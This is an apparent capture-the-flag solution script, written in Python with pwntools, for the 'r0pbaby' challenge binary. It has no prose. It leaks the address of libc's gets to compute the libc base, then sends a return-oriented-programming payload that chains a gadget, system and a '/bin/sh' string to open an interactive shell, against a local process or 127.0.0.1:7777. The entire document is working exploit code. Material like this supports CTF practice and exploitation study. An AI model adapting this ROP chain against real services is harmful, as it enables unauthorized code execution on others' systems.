from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elf = ELF("./r0pbaby")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = process("./r0pbaby")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
log.info('PID: ' + str(proc.pidof(p)[0]))

gdb.attach(p)

def run():
    #get libc base
    p.recvuntil('Exit')
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline('gets')
    p.recvuntil(':')
    libc_str = p.readline()
    gets = libc.symbols['gets']
    # print gets
    libc_base = int(libc_str,16) - gets
    log.success('libc base address:' + hex(libc_base))
    #stage2:get shell
    p.recvuntil("Exit")
    p.recvuntil(':')
    p.sendline('3')
    ppc = libc_base + 0x107419
    system = libc_base + libc.symbols['system']
    binsh = libc_base + 0x18cd57
    log.info("system address:" + hex(system))
    payload='f' * 8 + p64(ppc) + p64(system) + p64(binsh) 
    p.sendline(str(len(payload)))
    p.sendline(payload)
    p.interactive()
    p.close()

if __name__ == "__main__":
    run()
